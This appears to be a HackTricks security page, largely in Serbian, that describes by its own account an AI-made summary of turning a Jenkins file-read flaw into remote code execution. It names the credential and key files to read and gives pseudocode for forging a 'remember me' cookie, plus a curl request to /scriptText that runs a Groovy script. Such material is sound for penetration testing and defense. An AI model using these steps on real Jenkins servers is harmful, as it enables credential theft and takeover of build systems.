# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

U ovom blog postu je moguće pronaći odličan način da se transformiše ranjivost Local File Inclusion u Jenkins-u u RCE: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Ovo je AI kreirani sažetak dela posta gde se zloupotrebljava kreacija proizvoljnog kolačića za dobijanje RCE zloupotrebom lokalnog čitanja datoteka dok ne budem imao vremena da napravim svoj sažetak:

### Attack Prerequisites

* **Feature Requirement:** "Remember me" mora biti omogućeno (podrazumevani postavka).
* **Access Levels:** Napadač treba Overall/Read dozvole.
* **Secret Access:** Sposobnost čitanja binarnog i tekstualnog sadržaja iz ključnih datoteka.

### Detailed Exploitation Process

#### Step 1: Data Collection

**User Information Retrieval**

* Pristupite korisničkoj konfiguraciji i tajnama iz `$JENKINS_HOME/users/*.xml` za svakog korisnika da prikupite:
* **Korisničko ime**
* **Korisničko seme**
* **Vreme**
* **Hash lozinke**

**Secret Key Extraction**

* Izvucite kriptografske ključeve korišćene za potpisivanje kolačića:
* **Tajni ključ:** `$JENKINS_HOME/secret.key`
* **Glavni ključ:** `$JENKINS_HOME/secrets/master.key`
* **MAC ključ datoteka:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Step 2: Cookie Forging

**Token Preparation**

*   **Izračunajte vreme isteka tokena:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Dodaje jedan sat trenutnom vremenu
```
{% endcode %}
*   **Kombinujte podatke za token:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Key Decryption**

*   **Dešifrujte MAC ključ datoteka:**

```javascript
key = toAes128Key(masterKey)  // Pretvorite glavni ključ u AES128 format
decrypted = AES.decrypt(macFile, key)  // Dešifrujte .mac datoteku
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Signature Computation**

*   **Izračunajte HMAC SHA256:**

```javascript
mac = HmacSHA256(token, macKey)  // Izračunajte HMAC koristeći token i MAC ključ
tokenSignature = bytesToHexString(mac)  // Pretvorite MAC u heksadecimalni string
```

**Cookie Encoding**

*   **Generišite konačni kolačić:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Base64 kodirajte podatke kolačića
```
{% endcode %}

#### Step 3: Code Execution

**Session Authentication**

* **Preuzmite CSRF i sesijske tokene:**
* Napravite zahtev ka `/crumbIssuer/api/json` da dobijete `Jenkins-Crumb`.
* Zabeležite `JSESSIONID` iz odgovora, koji će se koristiti zajedno sa kolačićem za zapamti me.

**Command Execution Request**

*   **Pošaljite POST zahtev sa Groovy skriptom:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy skripta može se koristiti za izvršavanje komandi na sistemskom nivou ili drugih operacija unutar Jenkins okruženja.

Primer curl komande prikazan je kako bi se demonstriralo kako napraviti zahtev ka Jenkins-u sa potrebnim zaglavljima i kolačićima za sigurno izvršavanje proizvoljnog koda.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
